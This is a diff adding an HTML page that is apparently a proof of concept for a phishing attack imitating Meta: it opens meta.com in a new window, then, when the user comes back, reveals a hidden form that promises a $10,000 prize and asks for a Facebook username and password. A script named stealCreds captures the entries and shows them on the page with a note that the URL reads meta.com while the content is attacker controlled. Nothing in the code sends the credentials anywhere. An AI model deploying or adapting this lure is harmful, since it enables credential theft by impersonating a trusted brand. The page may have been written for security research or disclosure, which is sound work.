@@ -1,0 +1,157 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>tesT123</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #fff;
+        text-align: center;
+      }
+      .box {
+        max-width: 420px;
+        padding: 32px;
+      }
+      h1 {
+        color: #4285f4;
+        margin-bottom: 12px;
+      }
+      p {
+        color: #666;
+        margin-bottom: 24px;
+      }
+      button {
+        padding: 12px 20px;
+        border: none;
+        border-radius: 8px;
+        background: #4285f4;
+        color: #fff;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      .fake-panel {
+        margin-top: 24px;
+        padding: 20px;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        background: #fafafa;
+      }
+      #initialContent {
+        display: block;
+      }
+      #phishContent {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+      <div id="initialContent">
+        <h1>Meta Rewards Website</h1>
+        <p>
+          Click the button ( Click Here ) below to proceed to meta.com, then click the back
+          navigation ( <- ) to claim your $10,000 prize.
+        </p>
+        <button onclick="runPoC()">Click Here</button>
+      </div>
+
+      <div id="phishContent" class="fake-panel">
+        <h3>
+          This page is a meta.com page, you can see it yourself above, please
+          fill in your facebook username and password below to claim the $10,000
+          prize, the prize will be sent via your facebook account notification,
+          so please fill in the username and password correctly according to
+          your account.
+        </h3>
+
+        <form id="phishForm" onsubmit="stealCreds(event)">
+          <div>
+            <label>Username:</label><br />
+            <input
+              type="text"
+              id="username"
+              name="username"
+              size="40"
+              required
+            />
+          </div>
+          <div style="margin-top: 10px">
+            <label>Password:</label><br />
+            <input
+              type="password"
+              id="password"
+              name="password"
+              size="40"
+              required
+            />
+          </div>
+          <div style="margin-top: 15px">
+            <button type="submit">SUbmit</button>
+          </div>
+        </form>
+
+        <div id="result" style="margin-top: 10px"></div>
+      </div>
+    </div>
+
+    <script>
+      let spoofWindow = null;
+      let isBackPressed = false;
+
+      function stealCreds(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        if (username && password) {
+          document.getElementById("result").innerHTML = `
+            <strong style="color:green;">CAPTUREDD</strong><br>
+            Username: ${username}<br>
+            Password: ${password}<br>
+            <small style="color:#666;">URL shows meta.com but content is attacker controlled</small>
+          `;
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
+        } else {
+          document.getElementById("result").innerHTML =
+            '<span style="color:red;">Please fill in both fields</span>';
+        }
+      }
+
+      function runPoC() {
+        spoofWindow = window.open("https://www.meta.com", "_blank");
+
+        const checkInterval = setInterval(() => {
+          if (spoofWindow && spoofWindow.closed) {
+            clearInterval(checkInterval);
+            if (!isBackPressed) {
+              isBackPressed = true;
+              document.getElementById("initialContent").style.display = "none";
+              document.getElementById("phishContent").style.display = "block";
+            }
+          }
+        }, 500);
+
+        window.addEventListener("pageshow", function (event) {
+          if (
+            event.persisted ||
+            (performance.getEntriesByType("navigation")[0] &&
+              performance.getEntriesByType("navigation")[0].type ===
+                "back_forward")
+          ) {
+            document.getElementById("initialContent").style.display = "none";
+            document.getElementById("phishContent").style.display = "block";
+          }
+        });
+      }
+      document.getElementById("phishContent").style.display = "none";
+    </script>
+  </body>
+</html>
